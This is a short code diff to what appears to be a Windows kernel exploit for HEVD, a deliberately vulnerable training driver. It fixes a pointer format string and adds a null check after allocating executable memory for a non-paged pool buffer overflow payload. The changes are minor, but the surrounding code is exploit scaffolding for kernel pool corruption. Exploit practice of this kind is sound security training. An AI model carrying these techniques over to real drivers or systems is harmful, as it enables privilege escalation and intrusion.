@@ -19,7 +19,7 @@ HANDLE HevdOpenDeviceHandle()
         exit(1);
     }
 
-    printf("[+] HEVD device handle: 0x%llX\n", hFile);
+    printf("[+] HEVD device handle: 0x%p\n", hFile);
 
     return hFile;
 }
@@ -32,6 +32,11 @@ int HevdTriggerBufferOverflowNonPagedPoolNx(HANDLE hHevd, char* overflow_chunk_b
         payload_len + 0x1,
         MEM_RESERVE | MEM_COMMIT,
         PAGE_EXECUTE_READWRITE);
+
+    if (!input_buff)
+    {
+        return 0;
+    }
 
     memset(input_buff, 0x41, payload_len);
     memcpy((LPVOID)((uintptr_t)input_buff + 0x200), overflow_chunk_buf, 0x14);
